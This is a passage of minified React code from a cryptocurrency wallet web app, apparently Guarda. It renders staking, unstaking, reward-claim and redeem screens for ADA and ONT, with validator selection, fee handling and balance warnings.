              , {effectiveCurrency: I, effectiveValidatorRate: P, effectiveValidatorTitle: L, effectiveFee: F, effectivePrivateKey: W} = useEffectiveValue({
                fromWalletCurrency: (null == g ? void 0 : g.currency) || "",
                validatorRate: o || "",
                validatorTitle: c || "",
                fee: w,
                fromWalletPrivateKey: (null == g ? void 0 : g.privateKey) || ""
            })
              , {formattedFeeCurrency: R, formattedCurrency: B, formattedAmount: D, formattedFamily: U} = useFormattedValue({
                feeWallet: v,
                fromWallet: g,
                amount: l
            })
              , {equivalentAmount: G, equivalentAmountUsd: V} = useEquivalentValue({
                amount: l,
                fromWallet: g
            })
              , K = (0,
            O.useCallback)((async e => {
                await executeCallbackAndSetTimeout({
                    callback: () => d(lb.setProcessCommit({
                        processText: e
                    }))
                })
            }
            ), [d])
              , handleBack = () => {
                u.replace({
                    pathname: (0,
                    M.RU)("/receive")
                })
            }
              , handleConfirm = () => {
                h || x || k || !g || t || d(lb.unstakeConfirm({
                    uuid: g.uuid,
                    wallet: {
                        currency: g.currency,
                        balance: g.balance,
                        privateKey: W,
                        address: g.address,
                        rewardAddress: g.rewardAddress
                    },
                    resource: C,
                    fee: F,
                    validatorAddress: i,
                    amount: l || ""
                }))
            }
            ;
            (0,
            O.useEffect)((function showLoadingTextOfLoadingFee() {
                d(k ? lb.setLoadingStart({
                    processText: "Loading Fee..."
                }) : lb.setLoadingStop())
            }
            ), [d, k, K]);
            (0,
            O.useLayoutEffect)((function goToNextStepIfHaveTransactionHash() {
                if (E) {
                    const e = new URLSearchParams({
                        type: `${null == g ? void 0 : g.currency}UnstakeTx`,
                        amount: l || "",
                        hash: E,
                        walletFrom: (null == g ? void 0 : g.uuid) || "",
                        currency: (null == g ? void 0 : g.currency) || ""
                    });
                    u.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: e.toString()
                    })
                }
            }
            ), [l, null == g ? void 0 : g.currency, null == g ? void 0 : g.uuid, u, E]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    d(lb.setClearStore())
                }
            }
            ), []);
            return g && v ? O.createElement("div", {
                className: QG
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, r)), O.createElement("div", {
                className: JG
            }, O.createElement("div", {
                className: aV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Unstake ", D, " ", O.createElement("span", {
                className: "nowrap"
            }, B), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, D, " ", O.createElement("span", {
                className: "nowrap"
            }, B), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: G,
                renderCurrency: !0
            })))), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: g
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Validator", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, L && O.createElement("span", {
                id: `${I}Validator`
            }, L), P ? ` - ${P}` : "", O.createElement(ConfirmInfoSubValue, null, i))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, n ? "Max Network Fee" : "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: C,
                fee: w,
                isLoadingFee: k,
                feeWallet: v,
                formattedFeeCurrency: C && (0,
                be.iX)(C) || R
            }))), O.createElement("div", {
                className: nV
            }), O.createElement(ledger_token_info, {
                parentWallet: v
            }), O.createElement(HardWalletMessage, {
                isVisible: h && T,
                hardWalletType: N || "",
                formattedFamily: U
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: b,
                handleRetryFee: S
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: x,
                formattedFeeCurrency: R,
                fee: w,
                fromWallet: g,
                isFeeWalletOng: A,
                feeWalletBalance: v.balance
            }), f && O.createElement(bf, {
                error: f
            }), O.createElement("div", {
                className: sV
            }, h && O.createElement("div", {
                className: uV
            }, p && O.createElement("span", null, p)), !h && O.createElement("div", {
                className: iV
            }, "Step 2 of 3"), O.createElement("div", {
                className: oV
            }, !h && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(CloseOrConfirmButton, {
                showConfirmButton: !x,
                isLoading: h,
                onClick: handleConfirm,
                walletUuid: g.uuid
            })))), O.createElement("input", {
                id: `${g.currency}UnstakeAmountInUsd`,
                type: "hidden",
                name: "amountInUsd",
                value: V
            })) : null
        }
          , gV = "Your funds will be refunded (on your balance) after 7 epochs (up to 7 days), or you can redelegate them after 1 epoch."
          , OneUnstakeConfirm = () => O.createElement(UnstakeConfirm_UnstakeConfirm, {
            rightBlockText: gV,
            customAdditionalSend: {
                isStakingTx: !0
            },
            isMaxNetworkFee: !0
        })
          , SmallRewardWarning = e => {
            let {isVisible: t} = e;
            return O.createElement(O.Fragment, null, t && O.createElement(ui_message, {
                type: "warning"
            }, "Your reward amount is less than the fee amount."))
        }
          , yV = "claim-confirm_wrapper_1TWY8 app_wrapperBlock_2EpA3"
          , vV = "claim-confirm_wrapperForm_30whA app_wrapperLeftBlock_3QLZp"
          , _V = "claim-confirm_lock_gDjlg"
          , wV = "claim-confirm_wrapperCenterForm_Cv7m1 app_wrapperCenterBlock_bcslh"
          , bV = "claim-confirm_headerTitles_2zNM7"
          , kV = "claim-confirm_separator_2qahq"
          , SV = "claim-confirm_isConfirmError_1_qTl"
          , CV = "claim-confirm_flickerAnimation_mrvAr"
          , NV = "claim-confirm_footerBlock_2vM5b"
          , TV = "claim-confirm_stepInfo_eTsiA"
          , AV = "claim-confirm_buttonsWrapper_3uHN-"
          , xV = "claim-confirm_feeInfoToggle_3T__M"
          , IV = "claim-confirm_loaderWrapper_3XKCl"
          , PV = "claim-confirm_updateBalanceLink_3eBYz"
          , LV = "claim-confirm_errorParams_2i67B"
          , FV = "claim-confirm_topUpWalletLink_2w9GN"
          , WV = "claim-confirm_userSelect_uDbOr"
          , RV = "claim-confirm_tokenInfoBlock_2a9PN"
          , BV = "claim-confirm_tokenInfoBlockItem_1vH1K"
          , ClaimConfirm_ClaimConfirm = e => {
            let {customCondition: t, customAdditionalSend: a, isMaxNetworkFee: n, amountForFee: r} = e;
            const {amount: l, walletFrom: s} = useLocationSearch()
              , i = (0,
            j.k6)()
              , o = (0,
            $.I0)()
              , c = (0,
            $.v9)(nx)
              , u = (0,
            $.v9)(rx)
              , d = (0,
            $.v9)(sx)
              , m = (0,
            $.v9)(ix)
              , p = (0,
            O.useMemo)(( () => Boolean(c || m)), [c, m])
              , {fromWallet: f, feeWallet: E} = useWalletsForStakingTx({
                walletIdFromParams: s
            })
              , h = (0,
            O.useMemo)(( () => ({
                totalBalance: f ? f.balance : void 0,
                ...a
            })), [a, f])
              , [g,y,v,_,,w] = use_fee(f, f, r || 0, h)
              , {hardWalletType: b, isHardWallet: k, isFeeWalletOng: S, isInsufficientBalance: C, isSmallReward: N} = useBooleanRules({
                fee: g,
                feeWallet: E,
                fromWallet: f,
                amount: l,
                feeResource: w
            })
              , {effectiveFee: T, effectivePrivateKey: A} = useEffectiveValue({
                fromWalletCurrency: (null == f ? void 0 : f.currency) || "",
                validatorRate: "",
                validatorTitle: "",
                fee: g,
                fromWalletPrivateKey: (null == f ? void 0 : f.privateKey) || ""
            })
              , {formattedFeeCurrency: x, formattedCurrency: I, formattedAmount: P, formattedFamily: L} = useFormattedValue({
                feeWallet: E,
                fromWallet: f,
                amount: l
            })
              , {equivalentAmount: F, equivalentAmountUsd: W} = useEquivalentValue({
                amount: l,
                fromWallet: f
            })
              , R = (0,
            O.useCallback)((async e => {
                await executeCallbackAndSetTimeout({
                    callback: () => o(lb.setProcessCommit({
                        processText: e
                    }))
                })
            }
            ), [o])
              , handleBack = () => {
                i.replace({
                    pathname: (0,
                    M.RU)("/receive")
                })
            }
              , handleConfirm = () => {
                p || C || v || !f || t || o(lb.claimConfirm({
                    uuid: f.uuid,
                    wallet: {
                        currency: f.currency,
                        balance: f.balance,
                        privateKey: A,
                        address: f.address,
                        rewardAddress: f.rewardAddress
                    },
                    fee: T
                }))
            }
            ;
            (0,
            O.useEffect)((function showLoadingTextOfLoadingFee() {
                o(v ? lb.setLoadingStart({
                    processText: "Loading Fee..."
                }) : lb.setLoadingStop())
            }
            ), [o, v, R]);
            (0,
            O.useLayoutEffect)((function goToNextStepIfHaveTransactionHash() {
                if (m) {
                    const e = new URLSearchParams({
                        type: `${null == f ? void 0 : f.currency}ClaimTx`,
                        amount: l || "",
                        hash: m,
                        walletFrom: (null == f ? void 0 : f.uuid) || "",
                        currency: (null == f ? void 0 : f.currency) || ""
                    });
                    i.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: e.toString()
                    })
                }
            }
            ), [l, null == f ? void 0 : f.currency, null == f ? void 0 : f.uuid, i, m]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    o(lb.setClearStore())
                }
            }
            ), []);
            return f && E ? O.createElement("div", {
                className: yV
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, uG)), O.createElement("div", {
                className: vV
            }, O.createElement("div", {
                className: bV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Claim reward of ", P, " ", O.createElement("span", {
                className: "nowrap"
            }, I), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, P, " ", O.createElement("span", {
                className: "nowrap"
            }, I), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: F,
                renderCurrency: !0
            })))), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: f
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, n ? "Max Network Fee" : "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: w,
                fee: g,
                isLoadingFee: v,
                feeWallet: E,
                formattedFeeCurrency: (0,
                be.iX)(w) || x
            }))), O.createElement("div", {
                className: kV
            }), O.createElement(ledger_token_info, {
                parentWallet: E
            }), O.createElement(HardWalletMessage, {
                isVisible: p && k,
                hardWalletType: b || "",
                formattedFamily: L
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: y,
                handleRetryFee: _
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: C,
                formattedFeeCurrency: x,
                fee: g,
                fromWallet: f,
                isFeeWalletOng: S,
                feeWalletBalance: E.balance
            }), d && O.createElement(bf, {
                error: d
            }), O.createElement(SmallRewardWarning, {
                isVisible: N
            }), O.createElement("div", {
                className: NV
            }, p && O.createElement("div", {
                className: IV
            }, u && O.createElement("span", null, u)), !p && O.createElement("div", {
                className: TV
            }, "Step 2 of 3"), O.createElement("div", {
                className: AV
            }, !p && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(CloseOrConfirmButton, {
                showConfirmButton: !C,
                walletUuid: f.uuid,
                onClick: handleConfirm,
                isLoading: p
            })))), O.createElement("input", {
                id: `${f.currency}ClaimAmountInUsd`,
                type: "hidden",
                name: "amountInUsd",
                value: W
            })) : null
        }
          , OneClaimConfirm = () => {
            const e = {
                isStakingTx: !0
            };
            return O.createElement(ClaimConfirm_ClaimConfirm, {
                customAdditionalSend: e,
                isMaxNetworkFee: !0
            })
        }
          , OV = {
            wrapper: "index_wrapper_2hXFk app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_3ObIA app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_1dCKJ app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1VHI3 app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_cmQtf",
            toggleAdvancedOptionsText: "index_toggleAdvancedOptionsText_vyXvy"
        }
          , BoardAdaStakingPage = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , {defaultValidator: r, listOfValidators: l, isLoading: s} = PI()
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(void 0)
              , {fromWallet: p, setFromWallet: f} = oG({
                ticker: "ada"
            })
              , [E,h] = (0,
            O.useState)("0")
              , g = [...a].filter((e => "ada-shelley" === e.currency))
              , handleSetVisibleOptions = () => {
                o(!i)
            }
              , handleChangeFromWallet = t => {
                if (t) {
                    e(updateWalletsBalanceAndTxs(t, {
                        isCascade: !1
                    }));
                    f(t);
                    const a = new URLSearchParams({
                        walletFrom: t.uuid
                    });
                    n.replace({
                        search: a.toString()
                    })
                }
            }
              , handleSetValidator = e => {
                m(e)
            }
            ;
            (0,
            O.useEffect)(( () => {
                null != p && p.balance && h(null == p ? void 0 : p.balance);
                c && u(!1)
            }
            ), [p]);
            (0,
            O.useEffect)(( () => {
                m(r);
                o(!1)
            }
            ), [null == p ? void 0 : p.uuid, null == r ? void 0 : r.hash, r]);
            const handleNext = async () => {
                var e, a;
                const {isValid: r} = null !== (e = null === (a = t.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== e ? e : {};
                if (!r || !p || !d) {
                    u(!0);
                    return
                }
                const l = "2382bac66b58a4df1cf1775285529bbbefb9102ecea991e1da0aa064" === (null == d ? void 0 : d.hash)
                  , s = p.balance
                  , i = new URLSearchParams({
                    walletFrom: p.uuid,
                    amount: s,
                    validatorAddress: d.hash,
                    validatorRate: d.marginFee,
                    validatorTitle: d.title,
                    isValidatorEverstake: l ? l.toString() : ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-ada/staking/confirm"),
                    search: i.toString()
                })
            }
              , y = {
                precision: 6,
                min: "0",
                max: (0,
                Ko.FH)(E, {
                    max: 6
                }),
                available: E
            }
              , v = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "The approximate yield is 5%. Your funds will not be frozen and will remain free to move. Staking will be applied from the next epoch. The reward will begin to accrue from the 3rd epoch after staking.", O.createElement("br", null), O.createElement("br", null))));
            return O.createElement(sG, {
                wallet: p,
                styles: OV,
                RightBlockContent: v
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(Mh, {
                selectedWallet: p,
                wallets: g,
                onChange: handleChangeFromWallet,
                withoutWatchOnly: !0,
                withoutSubwallets: !0,
                customFilter: e => onCustomFilterWallets(e, ["ada-shelley"]),
                stakingCurrency: "ADA-Shelley"
            }), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: null == p ? void 0 : p.balance,
                rules: zf.amount(y)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && c,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    disabled: !0,
                    onChange: () => {}
                    ,
                    value: (null == p ? void 0 : p.balance) || "",
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: (null == p ? void 0 : p.currency) || "ada",
                maxAmount: E
            }), d && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, d.title, " (", d.subtitle, ")")), !d && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, O.createElement(LoaderDots, {
                visible: !0
            }))), !i && O.createElement("div", {
                className: OV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), i && O.createElement(O.Fragment, null, O.createElement("div", {
                className: OV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(Lp, {
                selected: d,
                isLoading: s,
                items: l,
                placeholder: "Select Validator Pool",
                emptyPlaceholder: "Validators pool not found",
                onChange: handleSetValidator
            }), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), O.createElement("div", {
                className: OV.footerBlock
            }, O.createElement("div", {
                className: OV.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next"))))
        }
          , DV = BoardAdaStakingPage
          , AdaStakeConfirm = () => {
            const e = useLocationSearch()
              , {fromWallet: t} = useWalletsForStakingTx({
                walletIdFromParams: e.walletFrom
            })
              , a = (0,
            O.useMemo)(( () => ({
                delegatorAddress: e.validatorAddress,
                rewardAddress: t && t.rewardAddress
            })), [t, e.validatorAddress]);
            return O.createElement(StakeConfirm_StakeConfirm, {
                customAdditionalSend: a,
                isStakeWholeBalance: !0,
                toWalletIsFromWallet: !0
            })
        }
          , MV = {
            wrapper: "index_wrapper_2NFYO app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_EnY6E app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_3hiZW app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1LGw9 app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_2eUGl",
            availableTitle: "index_availableTitle_3m9qC",
            toggleAdvancedOptionsText: "index_toggleAdvancedOptionsText_11Xnq"
        }
          , StakingOntIndex = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , p = (0,
            O.useMemo)(( () => {
                var e;
                return null !== (e = null == o ? void 0 : o.isReachedStakeCap) && void 0 !== e && e
            }
            ), [null == o ? void 0 : o.isReachedStakeCap])
              , {convertToFiat: f} = useConverter()
              , {fromWallet: E, setFromWallet: h, validatorAddress: g, amount: y, setAmount: v} = oG({
                ticker: "ont"
            })
              , _ = [...a].filter((e => "ont" === e.currency))
              , {listOfValidators: w, defaultValidator: b, isLoading: k} = Lx()
              , S = 0
              , C = (0,
            Ko.FH)(E ? E.balance : "0", {
                roundDown: !0,
                max: 0
            });
            (0,
            O.useEffect)(( () => v(C)), [C]);
            (0,
            O.useEffect)(( () => {
                m(!1);
                if (g || 0 === w.length) {
                    const e = w.find((e => (null == e ? void 0 : e.address) === g));
                    c(e)
                } else
                    c(w[0]);
                l(!1)
            }
            ), [b, null == E ? void 0 : E.uuid, g, w]);
            const handleSetVisibleOptions = () => {
                l(!r)
            }
              , handleChangeFromWallet = t => {
                e(setActiveWallet(t));
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                h(t)
            }
              , handleSetValidator = e => {
                m(!1);
                c(e)
            }
            ;
            (0,
            O.useEffect)(( () => {
                s && i(!1)
            }
            ), [E]);
            function checkIfEnoughAmount() {
                const e = undefined;
                (0,
                Ko.lt)(null == o ? void 0 : o.minDeposit, C) || m(!0)
            }
            const handleNext = async () => {
                var e;
                if (p)
                    return;
                checkIfEnoughAmount();
                const {isValid: a} = null == t || null === (e = t.current) || void 0 === e ? void 0 : e.validate();
                if (!a || !E || !o) {
                    i(!0);
                    return
                }
                const r = {
                    validatorTitle: (null == o ? void 0 : o.title) || "",
                    validatorAddress: (null == o ? void 0 : o.address) || "",
                    validatorRate: (null == o ? void 0 : o.rate) || "",
                    walletFrom: (null == E ? void 0 : E.uuid) || "",
                    validatorPublicKey: (null == o ? void 0 : o.pk) || "",
                    amount: y
                }
                  , l = (0,
                Ko.FH)(f(y, E, "usd"), {
                    max: 4
                });
                l && Object.assign(r, {
                    amountInUsd: l
                });
                const s = new URLSearchParams(r);
                n.push({
                    pathname: (0,
                    M.RU)("/staking-ont/staking/confirm"),
                    search: s.toString()
                })
            }
              , N = {
                precision: 0,
                min: o ? `${o.minDeposit}` : "1",
                max: C,
                available: C
            };
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                v(a)
            }
            const T = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "The rewards will start accruing from the next round. Please note that after unstaking, your funds may remain locked up to 2 rounds.")));
            return E ? O.createElement(sG, {
                wallet: E,
                styles: MV,
                RightBlockContent: T
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From", u), O.createElement(lf.ValidatorField, {
                rules: [...zf.wallet],
                value: E
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Mh, {
                    disabled: !0,
                    selectedWallet: E,
                    wallets: _,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    withoutSubwallets: !0,
                    customFilter: e => onCustomFilterWallets(e, ["ont"]),
                    stakingCurrency: "ONT"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: y,
                rules: [...zf.amount(N)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: y,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: E.currency,
                maxAmount: C,
                setAmount: v
            }), o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Delegation Amount:"), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(1), " ONT")), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, null == o ? void 0 : o.title, " (", null == o ? void 0 : o.subtitle, ")")), !r && !g && O.createElement("div", {
                className: MV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), r && !g && O.createElement(O.Fragment, null, O.createElement("div", {
                className: MV.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.trxValidator,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Lp, {
                    selected: o,
                    isLoading: k,
                    items: w,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), o && d && O.createElement(ui_message, {
                type: "error"
            }, "The chosen validator requires a minimum delegation amount of ", o.minDeposit, " ONT to pay the reward. Please try a different validator."), o && p && O.createElement(ui_message, {
                type: "error"
            }, o.title, " has reached the Stake Cap and is currently not accepting new delegates. Choose another validator for staking in Advanced options."), O.createElement("div", {
                className: MV.footerBlock
            }, O.createElement("div", {
                className: MV.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
          , UV = StakingOntIndex
          , GV = "unstake_wrapper_3dU6E app_wrapperBlock_2EpA3"
          , VV = "unstake_wrapperForm_2yVs9 app_wrapperLeftBlock_3QLZp"
          , KV = "unstake_footerBlock_2Wnn0 app_footerBlock_n86Kc"
          , HV = "unstake_stepInfo_1_XxN app_stepInfo_2VLE6"
          , zV = "unstake_toggleAdvancedOptions_1hfRK"
          , jV = "unstake_updateBalanceLink_zqNDJ"
          , StakingOntUnstakeIndex = () => {
            const e = O.createRef()
              , t = (0,
            j.k6)()
              , [a,n] = (0,
            O.useState)(!1)
              , [r] = (0,
            O.useState)(void 0)
              , [l,s] = (0,
            O.useState)("0")
              , [i,o] = (0,
            O.useState)(!1)
              , {fromWallet: c, amount: u, setAmount: d, validatorAddress: m, validatorTitle: p, initialAmount: f} = oG({
                ticker: "ont"
            })
              , [E] = use_fee(c, c, f, {
                totalBalance: c ? c.balance : void 0
            })
              , h = (0,
            O.useMemo)(( () => ({
                precision: "0",
                min: r ? `${null == r ? void 0 : r.minDeposit}` : "0",
                max: (0,
                Ko.FH)(f, {
                    max: 0
                }),
                available: f
            })), [f, r]);
            (0,
            O.useEffect)(( () => {
                a && n(!1)
            }
            ), [c]);
            (0,
            O.useEffect)(( () => {
                if (E && c) {
                    const e = c.subWallets.length && c.subWallets.find((e => "ong" === e.currency));
                    if (e) {
                        o((0,
                        Ko.gt)(E, e.balance));
                        s(e.balance)
                    }
                }
            }
            ), [E, c]);
            const handleNext = async () => {
                var a;
                const {isValid: r} = null == e || null === (a = e.current) || void 0 === a ? void 0 : a.validate();
                if (!r) {
                    n(!0);
                    return
                }
                const l = new URLSearchParams({
                    walletFrom: (null == c ? void 0 : c.uuid) || "",
                    validatorTitle: p,
                    validatorAddress: m,
                    amount: u
                });
                t.push({
                    pathname: (0,
                    M.RU)("/staking-ont/unstaking/confirm"),
                    search: l.toString()
                })
            }
              , handleClose = async () => {
                t.push({
                    pathname: (0,
                    M.RU)("/receive")
                })
            }
            ;
            if (!c)
                return null;
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                d(a)
            }
            return O.createElement("div", {
                className: GV
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Funds will be locked for up to 2 rounds, then change its status to Redeemable. After that, you can claim them back (redeem) to your wallet.")), O.createElement("div", {
                className: VV
            }, O.createElement(sf(), {
                ref: e
            }, O.createElement(label, null, "Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: u,
                rules: [...zf.amount(h)]
            }, (e => {
                let {isValid: t, message: n} = e;
                return O.createElement(pa, {
                    isInvalid: !t && a,
                    message: n
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), c && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: () => d(f)
            }, (0,
            Ko.yF)(f), " ONT")), c && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(E), " ", (0,
            be.xG)("ong"))), r && r.minDeposit && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Deposit Amount:"), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(r.minDeposit), " ONT")), i && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ONG balance to pay the miner's fee. Available balance: ", l, " ONG.  ", O.createElement("a", {
                className: jV,
                href: "https://support.guarda.com/assets/how-to-send-tokens",
                target: "_blank",
                rel: "noreferrer"
            }, "Why do I need ONG?")), O.createElement("div", {
                className: KV
            }, O.createElement("div", {
                className: HV
            }, "Step 1 of 3"), i ? O.createElement(Yl, {
                onClick: handleClose,
                color: "blue",
                size: "big"
            }, "Close") : O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))))
        }
          , $V = StakingOntUnstakeIndex;
        let ZV = !1;
        const YV = /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{34}$/
          , qV = /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51,52}$/
          , XV = /^[a-fA-F0-9]{66}$/
          , StakingOntRadeem = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            $.I0)()
              , n = (0,
            $.v9)($c)
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)("")
              , [c,u] = (0,
            O.useState)("")
              , [d,m] = (0,
            O.useState)(void 0)
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)("0")
              , {localCurrency: g} = local_currency_useLocalCurrency()
              , {convertToFiat: y} = useConverter()
              , [v] = fee_wallet(d)
              , [_,,w] = use_fee(d, d, e.amount, {
                totalBalance: d ? d.balance : void 0
            })
              , b = (0,
            O.useMemo)(( () => (null == d ? void 0 : d.hw) || (null == v ? void 0 : v.hw)), [null == v ? void 0 : v.hw, null == d ? void 0 : d.hw])
              , k = (0,
            O.useMemo)(( () => y(e.amount, d)), [y, d, e.amount])
              , S = (0,
            O.useMemo)(( () => y(_ || void 0, v || void 0)), [y, _, v])
              , setProcess = async e => {
                o(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                n.length && m(r(e.walletFrom) || void 0)
            }
            ), [e.walletFrom, r, n]);
            (0,
            O.useEffect)(( () => {
                a(updateWalletsBalanceAndTxs(d, {
                    isCascade: !0
                }))
            }
            ), [a, d]);
            (0,
            O.useEffect)(( () => {
                if (_ && d) {
                    const e = d.subWallets.length && d.subWallets.find((e => "ong" === e.currency));
                    if (e) {
                        f((0,
                        Ko.gt)(_, e.balance));
                        h(e.balance)
                    }
                }
            }
            ), [_, d]);
            (0,
            O.useEffect)(( () => {
                if (c) {
